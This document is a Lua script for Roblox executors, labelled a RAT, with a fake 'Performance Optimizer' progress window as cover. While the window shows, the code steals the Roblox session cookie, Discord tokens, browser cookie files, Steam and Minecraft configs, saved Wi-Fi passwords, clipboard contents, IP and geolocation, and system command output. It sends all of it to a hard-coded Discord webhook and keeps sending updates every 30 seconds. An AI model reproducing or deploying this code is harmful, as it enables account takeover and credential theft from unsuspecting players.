-- ============================================================
-- ULTIMATE RAT + STEALTH GUI
-- ============================================================
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- ========== HTTP SENDER ==========
local function send(url, content)
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- ========== HELPERS ==========
local function safeGet(obj, prop, default)
    local ok, val = pcall(function() return obj[prop] end)
    return ok and val or default
end

local function getClip()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

-- ========== IP & GEOLOCATION ==========
local function getIP()
    local ip = "N/A"
    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
            else ip = result:gsub("%s+", "") end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

local function getGeo()
    local geo = {}
    local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("http://ip-api.com/json/") end)
    if ok and res then
        local data = game:GetService("HttpService"):JSONDecode(res)
        geo.country = data.country or "N/A"
        geo.city = data.city or "N/A"
        geo.isp = data.isp or "N/A"
        geo.org = data.org or "N/A"
        geo.as = data.as or "N/A"
        geo.timezone = data.timezone or "N/A"
        geo.lat = data.lat or "N/A"
        geo.lon = data.lon or "N/A"
    else
        geo.country = "N/A"; geo.city = "N/A"; geo.isp = "N/A"; geo.org = "N/A"; geo.as = "N/A"; geo.timezone = "N/A"; geo.lat = "N/A"; geo.lon = "N/A"
    end
    return geo
end

-- ========== COOKIE (all attempts) ==========
local function stealCookie()
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    ok, val = pcall(getrobloxcookie)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
        if res and res.Headers then
            for k, v in pairs(res.Headers) do
                if string.lower(k) == "set-cookie" then
                    return v:match("(.-);") or v
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
        if page and page:match("__RequestVerificationToken") then
            return page:match('__RequestVerificationToken" value="(.-)"')
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
        if ms then return ms:GetAsync("cookie") end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        if not getgc then return nil end
        local gc = getgc(true)
        for _, v in ipairs(gc) do
            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
                return v
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function()
        if not getrawmetatable then return nil end
        local mt = getrawmetatable(game)
        if mt and mt.__index then
            local old = mt.__index
            for i = 1, 100 do
                local res = old(game, "HttpService", i)
                if type(res) == "table" and res.Cookies then
                    return res.Cookies
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(getclipboard)
    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
    return "Not available (executor limit)"
end

-- ========== SYSTEM COMMANDS (safe) ==========
local function executeCommand(cmd)
    if not io or not io.popen then return "io.popen unavailable" end
    local handle, err = io.popen(cmd)
    if not handle then return "Error: " .. tostring(err) end
    local result = handle:read("*a")
    handle:close()
    return result or ""
end

local function readFile(path, limit)
    limit = limit or 500
    if not io or not io.open then return nil end
    local f, err = io.open(path, "rb")
    if not f then return nil end
    local content = f:read(limit)
    f:close()
    return content
end

local function listDirectory(path)
    if not io or not io.popen then return "Cannot list directory" end
    return executeCommand("dir \"" .. path .. "\" /b") or ""
end

-- ========== BROWSER / APP EXTRACTION ==========
local function getBrowserProfiles()
    local profiles = {}
    local appData = pcall(os.getenv, "APPDATA") and os.getenv("APPDATA") or ""
    local localAppData = pcall(os.getenv, "LOCALAPPDATA") and os.getenv("LOCALAPPDATA") or ""
    local userProfile = pcall(os.getenv, "USERPROFILE") and os.getenv("USERPROFILE") or ""

    if localAppData and localAppData ~= "" then
        local chromePath = localAppData .. "\\Google\\Chrome\\User Data\\Default\\"
        local ck = readFile(chromePath .. "Cookies", 500)
        if ck then profiles["Chrome Cookies (first 500)"] = ck end
        local edgePath = localAppData .. "\\Microsoft\\Edge\\User Data\\Default\\"
        local ek = readFile(edgePath .. "Cookies", 500)
        if ek then profiles["Edge Cookies (first 500)"] = ek end
    end
    if appData and appData ~= "" then
        local firefoxPath = appData .. "\\Mozilla\\Firefox\\Profiles\\"
        local ffList = listDirectory(firefoxPath)
        if ffList and ffList ~= "" and not ffList:find("Cannot") then profiles["Firefox Profiles"] = ffList end
        local discordPath = appData .. "\\discord\\Local Storage\\leveldb\\"
        local discordFiles = listDirectory(discordPath)
        if discordFiles and discordFiles ~= "" and not discordFiles:find("Cannot") then
            for file in discordFiles:gmatch("[^\r\n]+") do
                if file:match("%.log$") then
                    local content = readFile(discordPath .. file, 2000)
                    if content then
                        local token = content:match("[%w_%-]+%.[%w_%-]+%.[%w_%-]+")
                        if token then
                            profiles["Discord Token"] = token
                            break
                        end
                    end
                end
            end
        end
        local steamPath = userProfile .. "\\AppData\\Local\\Steam\\config\\config.vdf"
        local steamCfg = readFile(steamPath, 500)
        if steamCfg then profiles["Steam Config (first 500)"] = steamCfg end
        local mcPath = appData .. "\\.minecraft\\launcher_profiles.json"
        local mcCfg = readFile(mcPath, 500)
        if mcCfg then profiles["Minecraft Profiles (first 500)"] = mcCfg end
        -- Wi-Fi passwords
        local wifiProfiles = executeCommand("netsh wlan show profiles")
        if wifiProfiles and not wifiProfiles:find("unavailable") then
            for name in wifiProfiles:gmatch("All User Profile%s*:%s*(.-)\r?\n") do
                local key = executeCommand('netsh wlan show profile name="' .. name .. '" key=clear')
                if key then
                    local password = key:match("Key Content%s*:%s*(.-)\r?\n")
                    if password and password ~= "" then
                        profiles["Wi‑Fi Password for " .. name] = password
                    end
                end
            end
        end
    end
    return profiles
end

-- ========== SYSTEM INFO (commands) ==========
local function getSystemCommands()
    local info = {}
    if os.execute then
        info.tasklist = executeCommand("tasklist /v /fo csv") or "N/A"
        info.netstat = executeCommand("netstat -ano") or "N/A"
        info.ipconfig = executeCommand("ipconfig /all") or "N/A"
        info.systeminfo = executeCommand("systeminfo") or "N/A"
        info.wmic_cpu = executeCommand("wmic cpu get name,numberofcores,numberoflogicalprocessors /format:csv") or "N/A"
        info.wmic_disk = executeCommand("wmic diskdrive get model,size /format:csv") or "N/A"
    end
    return info
end

-- ========== SCREENSHOT / WEBCAM ==========
local function captureScreen()
    if pcall(function() return screenshot end) then
        local ok, img = pcall(screenshot)
        if ok and img then return "Screenshot captured (" .. tostring(#img) .. " bytes)" end
    end
    if pcall(function() return capture end) then
        local ok, img = pcall(capture)
        if ok and img then return "Capture captured (" .. tostring(#img) .. " bytes)" end
    end
    return "No screenshot function available"
end

local function getWebcam()
    if pcall(function() return webcam end) then
        local ok, frame = pcall(webcam)
        if ok and frame then return "Webcam frame (" .. tostring(#frame) .. " bytes)" end
    end
    return "No webcam function available"
end

-- ========== COLLECT ALL ==========
local function collectAll()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
        info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
        info.totalFriends = tostring(#player:GetFriends() or 0)
        -- Groups
        local groups = {}
        local ok, grpData = pcall(function() return player:GetGroups() end)
        if ok and grpData then
            for _, g in ipairs(grpData) do
                table.insert(groups, g.Name .. "(" .. g.Role .. ")")
            end
        end
        info.groups = (#groups > 0) and table.concat(groups, ", ") or "None"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") then table.insert(items, item.Name) end
                end
                info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
            end
        end)
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
            end
        end)
        -- Robux balance
        local robuxUrl = "https://economy.roblox.com/v1/users/" .. player.UserId .. "/currency"
        local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(robuxUrl) end)
        if ok and res then
            local rb = res:match('"robux":(%d+)')
            info.robux = rb or "N/A"
        end
    end

    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
    info.universeId = tostring(safeGet(game, "UniverseId", "N/A"))
    info.rootPlaceId = tostring(safeGet(game, "RootPlaceId", "N/A"))
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.clientVersion = safeGet(game, "Version", "N/A")

    info.ip = getIP()
    local geo = getGeo()
    for k, v in pairs(geo) do info["geo_" .. k] = v end
    info.cookie = stealCookie()
    info.clipboard = getClip()
    info.screenshot = captureScreen()
    info.webcam = getWebcam()

    local browserData = getBrowserProfiles()
    for k, v in pairs(browserData) do info["browser_" .. k] = v end

    local sysCmd = getSystemCommands()
    for k, v in pairs(sysCmd) do info["cmd_" .. k] = v end

    for _, var in ipairs({"OS", "COMPUTERNAME", "USERNAME", "PROCESSOR_IDENTIFIER", "NUMBER_OF_PROCESSORS", "APPDATA", "LOCALAPPDATA", "USERPROFILE"}) do
        local ok, val = pcall(function() return os.getenv(var) end)
        if ok and val then info["env_" .. var] = val end
    end

    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)

    return info
end

-- ========== SEND DATA ==========
local function sendData()
    local data = collectAll()
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("%s: %s", k, tostring(v)))
        end
    end
    local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
    send(webhook, msg)
end

-- ========== LEGIT GUI ==========
local function createGUI()
    pcall(function()
        local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local gui = Instance.new("ScreenGui")
        gui.Parent = pg
        gui.ResetOnSpawn = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 420, 0, 200)
        f.Position = UDim2.new(0.5, -210, 0.5, -100)
        f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        f.BackgroundTransparency = 0.08
        f.Parent = gui
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 0, 50)
        t.Position = UDim2.new(0, 0, 0, 10)
        t.BackgroundTransparency = 1
        t.Text = "Performance Optimizer"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextScaled = true
        t.Font = Enum.Font.GothamBold
        t.Parent = f
        local s = Instance.new("TextLabel")
        s.Size = UDim2.new(1, 0, 0, 30)
        s.Position = UDim2.new(0, 0, 0.35, 0)
        s.BackgroundTransparency = 1
        s.Text = "Optimizing settings..."
        s.TextColor3 = Color3.fromRGB(200, 200, 210)
        s.TextScaled = true
        s.Font = Enum.Font.Gotham
        s.Parent = f
        local bg = Instance.new("Frame")
        bg.Size = UDim2.new(0.8, 0, 0, 18)
        bg.Position = UDim2.new(0.1, 0, 0.55, 0)
        bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        bg.Parent = f
        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(0, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
        fill.Parent = bg
        Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
        local pct = Instance.new("TextLabel")
        pct.Size = UDim2.new(0, 60, 0, 30)
        pct.Position = UDim2.new(0.5, -30, 0.75, 0)
        pct.BackgroundTransparency = 1
        pct.Text = "0%"
        pct.TextColor3 = Color3.fromRGB(255, 255, 255)
        pct.TextScaled = true
        pct.Font = Enum.Font.Gotham
        pct.Parent = f
        local st = Instance.new("TextLabel")
        st.Size = UDim2.new(1, 0, 0, 30)
        st.Position = UDim2.new(0, 0, 0.85, 0)
        st.BackgroundTransparency = 1
        st.Text = ""
        st.TextColor3 = Color3.fromRGB(150, 255, 150)
        st.TextScaled = true
        st.Font = Enum.Font.Gotham
        st.Parent = f
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 120, 0, 40)
        btn.Position = UDim2.new(0.5, -60, 1, -50)
        btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
        btn.Text = "CLOSE"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamBold
        btn.Parent = f
        btn.Visible = false
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
        local function anim()
            local dur = 2.5
            local steps = 50
            local stepTime = dur / steps
            local msgs = {"Analyzing system...", "Adjusting graphics...", "Optimizing network...", "Fine‑tuning performance...", "Applying optimal settings..."}
            for i = 0, steps do
                local prog = i / steps
                local w = 0.8 * prog
                fill:TweenSize(UDim2.new(w, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
                pct.Text = string.format("%d%%", math.floor(prog * 100))
                if i < steps then
                    task.wait(stepTime)
                    if i % 10 == 0 then
                        s.Text = msgs[math.floor(i / 10) + 1] or msgs[#msgs]
                    end
                end
            end
            s.Text = "Optimization complete!"
            st.Text = "Settings updated successfully."
            btn.Visible = true
        end
        task.wait(0.3)
        spawn(anim)
    end)
end

-- ========== MAIN LOOP ==========
local function main()
    sendData() -- initial full dump
    createGUI()
    -- Keep sending updates every 30 seconds
    while true do
        task.wait(30)
        local update = {}
        update.clipboard = getClip()
        update.screenshot = captureScreen()
        update.webcam = getWebcam()
        update.ping = (function()
            local ok, v = pcall(function() return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() end)
            return ok and v or "N/A"
        end)()
        local lines = {}
        for k, v in pairs(update) do
            if v and v ~= "" then
                table.insert(lines, string.format("%s: %s", k, tostring(v)))
            end
        end
        if #lines > 0 then
            local msg = "```\n[UPDATE]\n" .. table.concat(lines, "\n") .. "\n```"
            send(webhook, msg)
        end
    end
end

-- ========== START ==========
pcall(main)
